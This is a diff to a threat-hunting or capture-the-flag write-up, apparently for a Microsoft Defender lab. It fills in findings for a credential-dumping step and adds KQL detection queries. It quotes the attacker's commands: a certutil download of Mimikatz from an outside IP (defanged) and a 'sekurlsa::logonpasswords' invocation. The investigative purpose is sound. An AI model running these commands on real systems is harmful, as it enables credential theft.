@@ -202,32 +202,28 @@ DeviceNetworkEvents
 <img width="1873" height="415" alt="Q10" src="https://github.com/user-attachments/assets/a0be21a6-3921-46fd-9e70-aad9a5c24ced" />
 
 ---
-##  Flag 12 – Identify the filename of the credential dumping tool
+##  Flag 12 & 13 – Identify the filename of the credential dumping tool and the module used to extract logon passwords
 
-**Objective**: 
+**Finding**: The attacker abused `certutil.exe` again to download the credential-harvesting tool `Mimikatz` from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `mm.exe` at `2025-11-19T19:07:22.8551193Z`. They then used the extraction module `sekurlsa::logonpasswords` to extract logon passwords from memory at `2025-11-19T19:08:26.2804285Z`.    
+**Commands Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` and `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
 
-**Finding**:  
-
-**KQL Query**:
+**KQL Queries**:
+```
+DeviceFileEvents
+| where DeviceName == "azuki-sl"
+| where FolderPath contains "WindowsCache"
+| order by Timestamp desc
 ```
 ```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where ProcessCommandLine contains "mm.exe"
 
-**Notes:**
+```
+<img width="1473" height="645" alt="Q13" src="https://github.com/user-attachments/assets/760915b2-b760-45b1-98d7-54966640542d" />
+
 ---
 
-##  Flag 13 – Identify the module used to extract logon passwords from memory
-
-**Objective**: 
-
-**Finding**:  
-
-**KQL Query**:
-```
-```
-
-**Notes:**
-
----
 ##  Flag 14 – Identify the compressed archive filename used for data exfiltration
 
 **Objective**: 
